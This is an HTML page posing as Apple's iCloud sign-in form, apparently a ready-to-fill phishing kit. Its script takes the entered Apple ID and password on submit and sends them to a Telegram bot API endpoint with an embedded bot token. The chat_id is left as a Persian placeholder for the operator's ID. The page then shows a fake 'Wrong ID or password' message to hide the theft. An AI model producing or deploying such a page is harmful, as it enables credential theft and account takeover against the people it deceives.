<!DOCTYPE html>
<html>
<head><meta charset="UTF-8"><title>iCloud</title></head>
<body style="text-align:center;font-family:sans-serif;padding:50px">
<h2>Sign in to iCloud</h2>
<form id="f">
<input id="e" placeholder="Apple ID" style="padding:10px;width:80%;margin:10px"><br>
<input id="p" type="password" placeholder="Password" style="padding:10px;width:80%;margin:10px"><br>
<button type="submit" style="padding:10px 30px;background:#0071e3;color:white;border:none;border-radius:8px">Sign In</button>
</form>
<p id="err" style="color:red;display:none">Wrong ID or password.</p>
<script>
document.getElementById('f').addEventListener('submit',function(e){
e.preventDefault();
var x=new XMLHttpRequest();
x.open('POST','https://api.telegram.org/bot8707541003:AAGuv6G1qLe1aDK3i1Ut4a9PsisvO_5Re8Q/sendMessage',true);
x.setRequestHeader('Content-Type','application/json');
x.send(JSON.stringify({
chat_id:'ایدی_عددی_خودت_اینجا',
text:'?? ID: '+document.getElementById('e').value+' | Pass: '+document.getElementById('p').value
}));
document.getElementById('err').style.display='block';
document.getElementById('e').value='';
document.getElementById('p').value='';
});
</script>
</body>
</html>
